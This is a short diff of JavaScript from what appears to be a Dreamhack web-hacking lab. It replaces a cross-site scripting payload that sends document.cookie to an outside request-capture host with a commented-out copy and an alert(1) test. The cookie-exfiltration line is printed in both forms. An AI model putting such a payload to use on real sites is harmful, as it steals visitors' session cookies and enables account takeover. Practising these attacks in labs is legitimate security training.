@@ -1,1 +1,2 @@
-location.href="https://rhrhdki.request.dreamhack.games/?cookies" + document.cookie;
+//location.href="https://rhrhdki.request.dreamhack.games/?cookies" + document.cookie;
+alert(1);
